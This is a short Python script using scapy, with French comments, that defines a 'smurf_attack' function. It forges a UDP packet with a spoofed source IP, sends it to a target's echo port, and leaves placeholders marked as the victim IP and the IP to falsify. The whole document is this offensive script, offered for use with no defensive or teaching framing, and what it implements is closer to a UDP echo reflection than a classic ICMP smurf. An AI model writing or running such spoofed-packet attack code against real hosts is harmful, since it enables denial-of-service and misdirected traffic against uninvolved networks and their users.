from scapy.all import *

def smurf_attack(target_ip, spoofed_ip):
    # Crée un paquet UDP avec l'IP falsifiée en tant que source
    udp_packet = IP(src=spoofed_ip, dst=target_ip)/UDP(dport=7)/Raw(load='Votre Message')

    # Envoie le paquet
    send(udp_packet)

if __name__ == "__main__":
    TARGET_IP = "x.x.x.x"  # IP de la victime
    SPOOFED_IP = "x.x.x.x"  # IP à falsifier (qui recevra la réponse)

    smurf_attack(TARGET_IP, SPOOFED_IP)
